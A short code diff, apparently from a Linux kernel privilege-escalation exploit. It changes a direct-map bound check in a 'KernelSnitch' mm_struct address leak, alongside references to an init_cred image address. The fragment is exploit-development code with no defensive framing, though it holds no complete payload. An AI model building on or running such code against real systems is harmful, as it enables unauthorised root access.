@@ -189,6 +189,8 @@ long sched_setattr_tid(int tid, int nice_value) {
 /* Bootloader-selected physical load address. */
 uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
 
+uint64_t g_direct_map_end = DIRECT_MAP_END;
+
 /* Selected entry's init_cred image address. */
 uintptr_t g_init_cred_image;
 
@@ -586,7 +588,7 @@ uintptr_t prepare_kernel_page(void) {
   /* mm_structs live in the direct map */
   if (leaked == (uintptr_t)-1 ||
       leaked < KERNELSNITCH_IDENTITY_START ||
-      leaked >= DIRECT_MAP_END) {
+      leaked >= g_direct_map_end) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
     kernelsnitch_cleanup(ks);
     ks = NULL;
